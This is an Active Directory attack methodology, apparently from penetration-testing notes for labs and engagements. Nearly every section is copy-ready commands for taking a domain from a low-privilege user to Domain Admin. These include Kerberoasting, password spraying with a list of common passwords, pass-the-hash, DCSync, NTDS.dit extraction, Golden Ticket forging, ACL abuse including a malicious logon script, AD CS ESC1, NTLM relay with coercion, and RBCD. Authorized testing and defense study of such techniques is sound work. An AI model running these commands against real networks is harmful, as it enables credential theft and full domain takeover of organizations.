---
id: "04"
title: "Active Directory"
tags: ["active-directory","windows"]
---
# 04 — Active Directory Methodology

> **Description:** Full AD compromise path — from domain user to Domain Admin.
> **Best For:** Internal engagements with Windows domain environments, OSCP/OSEP AD labs, HTB Pro Labs.
> **Strength:** Complete attack chain from unauthenticated enumeration through DCSync, Golden Ticket, and persistence — with exact commands for every step.

---

## Decision Tree: Low-Priv Domain Creds → What First?

```
Low-priv domain user creds in hand →

  STEP 1: Enumerate domain (BloodHound ingest, net commands)
      ↓
  STEP 2: Check for easy wins:
      → AS-REP Roasting (users with PreAuth disabled?)
      → Kerberoasting (SPNs registered on service accounts?)
      → Password spraying (others using same/simple passwords?)
      ↓
  STEP 3: Check your own permissions
      → BloodHound: "Shortest Paths to DA from Owned Principals"
      → GenericAll/GenericWrite/WriteDACL on any objects?
      ↓
  STEP 4: SMB access
      → CrackMapExec: can you read any shares?
      → Any passwords/configs in shares?
      ↓
  STEP 5: Lateral movement targets
      → Where can you WinRM/PSExec/RDP?
      → Reuse creds across machines
      ↓
  STEP 6: DCSync (if DA or with replication rights)
```

---

## 1. Initial Enumeration

### Without Credentials (Unauthenticated)

```bash
# SMB null session
enum4linux-ng -A <TARGET-IP> | tee scans/enum4linux.txt
crackmapexec smb <TARGET-IP> -u '' -p ''
crackmapexec smb <TARGET-IP> -u 'guest' -p ''

# LDAP anonymous bind
ldapsearch -x -H ldap://<TARGET-IP> -b "DC=domain,DC=local"
ldapsearch -x -H ldap://<TARGET-IP> -b "" -s base namingContexts    # Get base DN

# Nmap AD scripts
nmap --script ldap-rootdse -p 389 <TARGET-IP>
nmap --script smb-enum-domains,smb-enum-users,smb-os-discovery -p 445 <TARGET-IP>

# Kerbrute — valid user enumeration without logging
kerbrute userenum --dc <TARGET-IP> -d <DOMAIN> \
  /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt \
  | tee scans/kerbrute_users.txt

# rpcclient null session
rpcclient -U "" -N <TARGET-IP>
rpcclient> enumdomusers          # List domain users
rpcclient> enumdomgroups         # List domain groups
rpcclient> querydominfo          # Domain info
rpcclient> querydispinfo         # Detailed user info
```

### With Credentials

```bash
# CrackMapExec — everything
crackmapexec smb <TARGET-IP> -u <USER> -p <PASS>
crackmapexec smb <TARGET-IP> -u <USER> -p <PASS> --users
crackmapexec smb <TARGET-IP> -u <USER> -p <PASS> --groups
crackmapexec smb <TARGET-IP> -u <USER> -p <PASS> --shares
crackmapexec smb <TARGET-IP> -u <USER> -p <PASS> --pass-pol   # Password policy

# LDAP enumeration
ldapsearch -x -H ldap://<TARGET-IP> -D "<USER>@<DOMAIN>" -w <PASS> \
  -b "DC=<DOMAIN>,DC=LOCAL" "(objectClass=person)" \
  sAMAccountName mail memberOf | tee scans/ldap_users.txt

# All users
ldapsearch -x -H ldap://<TARGET-IP> -D "<USER>@<DOMAIN>" -w <PASS> \
  -b "DC=<DOMAIN>,DC=LOCAL" "(objectClass=user)" sAMAccountName

# Computers
ldapsearch -x -H ldap://<TARGET-IP> -D "<USER>@<DOMAIN>" -w <PASS> \
  -b "DC=<DOMAIN>,DC=LOCAL" "(objectClass=computer)" name operatingSystem

# Native Windows commands (from domain-joined machine or RDP session)
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Domain Controllers" /domain
net localgroup administrators

# PowerShell enumeration
Get-ADUser -Filter * -Properties * | Select Name,SamAccountName,Enabled,MemberOf
Get-ADGroup -Filter * | Select Name
Get-ADComputer -Filter * | Select Name,OperatingSystem,DNSHostName
Get-ADGroupMember -Identity "Domain Admins"
```

---

## 2. BloodHound

### Data Collection

```bash
# Option A: bloodhound-python (from Kali — no need to be on-target)
pip3 install bloodhound
bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -dc <DC-IP> -c All --zip
# Output: <TIMESTAMP>_BloodHound.zip

# Option B: SharpHound (from Windows target — more data, more stealthy options)
# Upload SharpHound.exe or SharpHound.ps1 to target
.\SharpHound.exe -c All --zipfilename bh_data.zip
# Or PowerShell version:
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -ZipFileName bh_data.zip
```

### Import & Start BloodHound

```bash
# Start Neo4j database
neo4j start    # or: sudo neo4j console

# Launch BloodHound
bloodhound &
# Default creds: neo4j:neo4j (change on first login)

# Import: drag and drop the .zip into BloodHound interface
```

### Key Queries to Run Immediately

```
1. "Find all Domain Admins"
2. "Shortest Paths to Domain Admins"
3. "Shortest Paths from Owned Principals" (mark your user as Owned first)
4. "Find Principals with DCSync Rights"
5. "Shortest Paths to High Value Targets"
6. "Find Computers where Domain Users are Local Admin"
7. "List all Kerberoastable Accounts"
8. "Find AS-REP Roastable Users"
9. "Find Computers with Unconstrained Delegation"
10. "Find Shortest Paths to Unconstrained Delegation Systems"
```

**Mark nodes as Owned:** Right-click any node → Mark User as Owned → Re-run "Shortest Paths from Owned"

---

## 3. Kerberoasting

**What it is:** Any authenticated domain user can request service tickets (TGS) for accounts with SPNs. The ticket is encrypted with the service account's password hash → crack offline.

```bash
# Step 1: Find Kerberoastable accounts (have SPNs)
# From Linux:
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP> -request | tee scans/kerberoast.txt

# From Windows:
setspn -Q */* | findstr /V "CN=krbtgt"
# Or with PowerView:
Get-DomainUser -SPN | Select SamAccountName,ServicePrincipalName

# Step 2: Request and save hashes
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP> -request -outputfile hashes/kerberoast_hashes.txt

# Step 3: Crack with hashcat
hashcat -m 13100 hashes/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hashes/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Step 4: Crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt hashes/kerberoast_hashes.txt --format=krb5tgs
```

**Priority targets:** Service accounts with high-privilege group memberships (check BloodHound).

---

## 4. AS-REP Roasting

**What it is:** Accounts with "Do not require Kerberos pre-authentication" enabled allow you to request encrypted TGTs without a password. Hash is crackable offline.

```bash
# Step 1: Find vulnerable accounts
# From Linux (without creds — pure unauthenticated attack):
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC-IP> -no-pass -format hashcat | tee hashes/asrep.txt

# With credentials (more reliable):
impacket-GetNPUsers <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP> -request | tee hashes/asrep.txt

# From Windows (with PowerView):
Get-DomainUser -PreauthNotRequired | Select SamAccountName

# Step 2: Crack
hashcat -m 18200 hashes/asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 hashes/asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt hashes/asrep.txt --format=krb5asrep
```

---

## 5. Password Spraying (Safe)

**Rule:** One password per spray. Respect the lockout threshold. Check `crackmapexec smb <DC-IP> -u <USER> -p <PASS> --pass-pol` first.

```bash
# Get lockout policy first
crackmapexec smb <DC-IP> -u <USER> -p <PASS> --pass-pol
# Look for: "Lockout Threshold" — spray 1 password per run, wait > observation window

# Get user list
crackmapexec smb <DC-IP> -u <USER> -p <PASS> --users | \
  grep -oP '(?<=DOMAIN\\\\)[^\s]+' > users.txt

# Spray with CrackMapExec
crackmapexec smb <DC-IP> -u users.txt -p 'Password123' --continue-on-success
crackmapexec smb <DC-IP> -u users.txt -p 'Welcome1' --continue-on-success
crackmapexec smb <DC-IP> -u users.txt -p 'Spring2024!' --continue-on-success
crackmapexec smb <DC-IP> -u users.txt -p '<COMPANY_NAME>123' --continue-on-success

# Kerbrute spray (no failed logins in event log — stealthier)
kerbrute passwordspray --dc <DC-IP> -d <DOMAIN> users.txt 'Password123'
```

**Common passwords to spray (in order of success rate):**
- `Password1`, `Password123`, `Welcome1`, `Welcome123`
- `<Company>2024!`, `<Company>123!`, `<Season><Year>!`
- `<MonthYear>!` e.g. `Summer2024!`
- `<Company>@123`

---

## 6. Pass-the-Hash (PTH)

**Requires:** NT hash of the target account. Works against NTLM-authenticated services.

```bash
# CrackMapExec PTH — check access across the network
crackmapexec smb <RANGE> -u Administrator -H <NTLM-HASH> --local-auth
crackmapexec smb <RANGE> -u <USER> -H <NTLM-HASH>

# evil-winrm PTH
evil-winrm -i <TARGET-IP> -u <USER> -H <NTLM-HASH>

# impacket tools PTH
impacket-psexec <USER>@<TARGET-IP> -hashes :<NTLM-HASH>
impacket-wmiexec <USER>@<TARGET-IP> -hashes :<NTLM-HASH>
impacket-smbexec <USER>@<TARGET-IP> -hashes :<NTLM-HASH>

# xfreerdp PTH (requires restricted admin mode on target)
xfreerdp /u:<USER> /pth:<NTLM-HASH> /v:<TARGET-IP> /cert:ignore
```

---

## 7. Pass-the-Ticket (PTT)

**Requires:** Valid Kerberos ticket (TGT or TGS). Domain-joined machine or Kali with Kerberos configured.

```bash
# Dump existing tickets (from Windows)
# Mimikatz:
sekurlsa::tickets /export         # Dumps all tickets to files
kerberos::list /export

# From Kali with impacket — request a ticket and use it
impacket-getTGT <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP>
# Output: <USER>.ccache

export KRB5CCNAME=<USER>.ccache
impacket-psexec <DOMAIN>/<USER>@<TARGET-HOSTNAME> -k -no-pass
impacket-wmiexec <DOMAIN>/<USER>@<TARGET-HOSTNAME> -k -no-pass
impacket-secretsdump <DOMAIN>/<USER>@<TARGET-HOSTNAME> -k -no-pass

# Silver ticket (forge TGS for specific service — needs service account hash)
# Mimikatz:
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN-SID> /target:<SERVER-FQDN> \
  /service:cifs /rc4:<SERVICE-ACCOUNT-HASH> /user:Administrator /ptt
```

---

## 8. Lateral Movement

### evil-winrm

```bash
# WinRM lateral movement
evil-winrm -i <TARGET-IP> -u <USER> -p <PASS>
evil-winrm -i <TARGET-IP> -u <USER> -H <HASH>

# Upload/download
upload /kali/tool.exe
download C:\path\to\file
```

### impacket-psexec / wmiexec / smbexec

```bash
# psexec — creates service, verbose, noisy
impacket-psexec <USER>:<PASS>@<TARGET-IP>
impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET-IP>

# wmiexec — quieter, uses WMI
impacket-wmiexec <USER>:<PASS>@<TARGET-IP>
impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET-IP>

# smbexec — SMB-based, moderate noise
impacket-smbexec <USER>:<PASS>@<TARGET-IP>

# With hash (PTH)
impacket-psexec <USER>@<TARGET-IP> -hashes :<NTLM-HASH>
impacket-wmiexec <USER>@<TARGET-IP> -hashes :<NTLM-HASH>
```

### CrackMapExec Execution

```bash
# Run command across all hosts
crackmapexec smb <RANGE> -u <USER> -p <PASS> -x "whoami"
crackmapexec smb <RANGE> -u <USER> -p <PASS> -X "Get-Process"    # PowerShell

# Execute script
crackmapexec smb <TARGET-IP> -u <USER> -p <PASS> --exec-method smbexec -x "net user"

# Dump SAM
crackmapexec smb <TARGET-IP> -u <USER> -p <PASS> --sam
# Dump LSA
crackmapexec smb <TARGET-IP> -u <USER> -p <PASS> --lsa
```

---

## 9. DCSync

**Requirements:** Account with one of these rights on the domain: `DS-Replication-Get-Changes`, `DS-Replication-Get-Changes-All` (Domain Admins, Enterprise Admins, or explicitly delegated).

```bash
# From Linux — impacket-secretsdump
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC-IP>
impacket-secretsdump <DOMAIN>/<USER>@<DC-IP> -hashes :<NTLM-HASH>

# Dump specific user
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC-IP> -just-dc-user Administrator
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC-IP> -just-dc-user krbtgt

# From Windows — Mimikatz
lsadump::dcsync /domain:<DOMAIN> /all
lsadump::dcsync /domain:<DOMAIN> /user:Administrator
lsadump::dcsync /domain:<DOMAIN> /user:krbtgt       # For Golden Ticket

# What to do with the output:
# 1. Crack NTLM hashes: hashcat -m 1000 hashes.txt rockyou.txt
# 2. PTH with Administrator hash to all machines
# 3. Use krbtgt hash → create Golden Ticket
# 4. Dump to file: impacket-secretsdump ... | tee loot/dcsync.txt
```

---

## 10. NTDS.dit Extraction (Offline)

**What it is:** Every credential in the domain lives in one file on each Domain Controller: `C:\Windows\NTDS\ntds.dit`. With Domain Admin, or admin rights on a DC, you copy that database and the SYSTEM registry hive, then pull every hash offline. It is the on-disk counterpart to DCSync: where DCSync copies the hashes over the network through the replication protocol, NTDS extraction takes the whole database off the box · louder, but total, and it works even when replication is locked down.

**Requirements:** Domain Admin, or administrative access to a Domain Controller. The live `ntds.dit` is locked while AD runs, so every method reads it through a Volume Shadow Copy or a built-in export, never a plain copy.

```cmd
# Method 1 · Volume Shadow Copy: snapshot C:, then copy the two locked files out
vssadmin create shadow /for=C:
# note the "Shadow Copy Volume Name" it prints (HarddiskVolumeShadowCopyN), then:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
vssadmin delete shadows /for=C: /quiet

# Method 2 · ntdsutil IFM: one built-in command writes both files
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ntds" quit quit
# output: C:\temp\ntds\Active Directory\ntds.dit  and  C:\temp\ntds\registry\SYSTEM

# Method 3 · esentutl via VSS: copy the live database directly
esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\temp\ntds.dit
```

```bash
# Extract every hash offline, on your box, once you have ntds.dit + SYSTEM
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL -just-dc-user krbtgt

# Or pull it straight from the DC over SMB (admin on the DC, no manual copy)
crackmapexec smb <DC-IP> -u <USER> -p <PASS> --ntds
netexec smb <DC-IP> -u <USER> -H <NTLM-HASH> --ntds

# Same endgame as DCSync, once you hold the hashes:
# 1. Crack the NTLM hashes: hashcat -m 1000 ntds.hashes rockyou.txt
# 2. Pass-the-Hash with the Administrator hash across the domain
# 3. krbtgt hash -> forge a Golden Ticket for long-term domain persistence
```

**Cleanup:** delete the shadow copy and securely wipe the exported `ntds.dit` and `SYSTEM` from the DC and your staging path · that one file is every credential in the domain, and leaving it behind is itself the finding.

---

## 11. Golden Ticket

**What it is:** A forged TGT signed with the krbtgt account's hash. Valid for 10 years by default. Survives password changes on other accounts. **Requires krbtgt hash from DCSync.**

```bash
# Step 1: Get krbtgt hash (from DCSync above)
# krbtgt hash: aad3b435b51404eeaad3b435b51404ee:6f7c6d5b8f...  (NT hash is second)

# Step 2: Get Domain SID
impacket-getPac <DOMAIN>/<USER>:<PASS> -targetUser Administrator
# Or from Windows: whoami /user → trim last RID (e.g., S-1-5-21-xxxx-xxxx-xxxx)

# Step 3: Create Golden Ticket — Mimikatz (from any Windows machine)
kerberos::golden /user:Administrator /domain:<DOMAIN> \
  /sid:<DOMAIN-SID> /krbtgt:<KRBTGT-NTLM-HASH> \
  /id:500 /groups:512 /ticket:golden.kirbi
kerberos::ptt golden.kirbi     # Inject into current session
misc::cmd                      # Open cmd with DA privileges

# Step 4: Create Golden Ticket — impacket (from Kali)
impacket-ticketer -nthash <KRBTGT-HASH> -domain-sid <SID> -domain <DOMAIN> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec <DOMAIN>/Administrator@<DC-HOSTNAME> -k -no-pass

# Use it
klist          # Confirm ticket loaded
dir \\<DC-IP>\C$
```

---

## 12. ACL / Misconfiguration Exploitation

### GenericAll (Full Control over Object)

```bash
# Detected in BloodHound — edge: GenericAll from your user to target user/group

# Reset target user's password
net rpc password <TARGET-USER> <NEW-PASS> -U <DOMAIN>/<YOUR-USER>%<YOUR-PASS> -S <DC-IP>

# From PowerView (Windows):
Set-DomainUserPassword -Identity <TARGET-USER> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# Add yourself to a group
net group "Domain Admins" <YOUR-USER> /add /domain

# From PowerView:
Add-DomainGroupMember -Identity "Domain Admins" -Members <YOUR-USER>
```

### GenericWrite (Write Object Properties)

```bash
# Can write to target object's attributes
# Attack: add SPN to target user → Kerberoast them
Set-DomainObject -Identity <TARGET-USER> -Set @{serviceprincipalname='fake/BLAH'}
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP> -request

# Attack: set logon script
Set-DomainObject -Identity <TARGET-USER> -Set @{scriptpath='\\<YOUR-IP>\share\malicious.bat'}
```

### WriteDACL (Modify ACL on Object)

```bash
# Add DCSync rights to your user
Add-ObjectACL -PrincipalIdentity <YOUR-USER> -TargetIdentity <DOMAIN> \
  -Rights DCSync

# Now run DCSync with your account
impacket-secretsdump <DOMAIN>/<YOUR-USER>:<PASS>@<DC-IP>
```

### Unconstrained Delegation

```bash
# Find computers with unconstrained delegation (BloodHound or):
impacket-findDelegation <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP>

# Any TGTs cached on this machine when privileged users connect
# Compromise the machine → dump TGTs with Mimikatz:
sekurlsa::tickets /export       # Dump all tickets
# Look for krbtgt or DA tickets → PTT → game over
```

---

## 13. AD CS Abuse (ESC1)

**What it is:** Active Directory Certificate Services is the most common modern path to Domain Admin. A misconfigured certificate template (ESC1: client-authentication EKU + enrollee-supplies-subject + low-priv enroll rights) lets any user request a certificate AS a Domain Admin, then authenticate with it. Certipy finds and exploits it end to end.

```bash
# Step 1: Find vulnerable templates
certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC-IP> -vulnerable -stdout

# Step 2: ESC1 — request a cert impersonating a Domain Admin
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC-IP> \
  -ca <CA-NAME> -template <VULN-TEMPLATE> -upn administrator@<DOMAIN>

# Step 3: Authenticate with the cert → NT hash + TGT
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>

# Step 4: Cash it in
impacket-secretsdump <DOMAIN>/administrator@<DC-IP> -hashes :<NT-HASH>
```

**Other ESCs worth a look:** ESC8 (relay NTLM to the CA web endpoint — see NTLM Relay below), ESC4 (template ACL you can edit), ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA).

---

## 14. NTLM Relay & Coercion

**What it is:** Force a machine (often a Domain Controller) to authenticate to you, then relay that authentication to another service (LDAP, SMB, or AD CS) where it grants access. Coercion triggers the auth; the relay cashes it in. A classic unauthenticated path to Domain Admin. Disable SMB and HTTP in Responder.conf so ntlmrelayx owns the relay.

```bash
# Passively poison LLMNR / NBT-NS to capture NetNTLM hashes
sudo responder -I <INTERFACE>

# Relay to LDAP → grant yourself RBCD or dump the domain
impacket-ntlmrelayx -t ldap://<DC-IP> -smb2support --delegate-access

# Relay to AD CS web enrollment (ESC8) → a DC certificate → Domain Admin
impacket-ntlmrelayx -t http://<CA-HOST>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce a DC to authenticate to your relay — PetitPotam (MS-EFSRPC)
python3 PetitPotam.py -u <USER> -p <PASS> -d <DOMAIN> <YOUR-IP> <DC-IP>

# Coerce via the Printer Bug (MS-RPRN)
python3 printerbug.py <DOMAIN>/<USER>:<PASS>@<DC-IP> <YOUR-IP>

# Coercer — tries every known coercion method at once
coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC-IP> -l <YOUR-IP>
```

---

## 15. Delegation Abuse (Constrained / RBCD)

**What it is:** Kerberos delegation lets a service act on behalf of a user; misconfigured, it is a privilege-escalation primitive. Constrained delegation (S4U) lets a compromised service impersonate anyone to specific services. Resource-Based Constrained Delegation (RBCD) lets you impersonate an admin to a machine whose `msDS-AllowedToActOnBehalfOfOtherIdentity` you can write.

```bash
# Find delegation across the domain
impacket-findDelegation <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP>

# Constrained delegation: a service you control impersonates a DA (S4U)
impacket-getST -spn cifs/<TARGET-FQDN> -impersonate administrator \
  <DOMAIN>/<SERVICE-ACCOUNT>:<PASS> -dc-ip <DC-IP>

# RBCD — when you have GenericWrite/GenericAll over a computer object:
# 1. Add a computer account you control (needs MachineAccountQuota > 0)
impacket-addcomputer <DOMAIN>/<USER>:<PASS> -computer-name 'EVIL$' -computer-pass 'Evil123' -dc-ip <DC-IP>
# 2. Point the target's RBCD at your computer
impacket-rbcd -delegate-from 'EVIL$' -delegate-to '<TARGET>$' -action write <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP>
# 3. Impersonate a Domain Admin to the target
impacket-getST -spn cifs/<TARGET-FQDN> -impersonate administrator -dc-ip <DC-IP> <DOMAIN>/'EVIL$':'Evil123'
export KRB5CCNAME=administrator@cifs_<TARGET-FQDN>@<DOMAIN>.ccache
impacket-psexec -k -no-pass <DOMAIN>/administrator@<TARGET-FQDN>
```
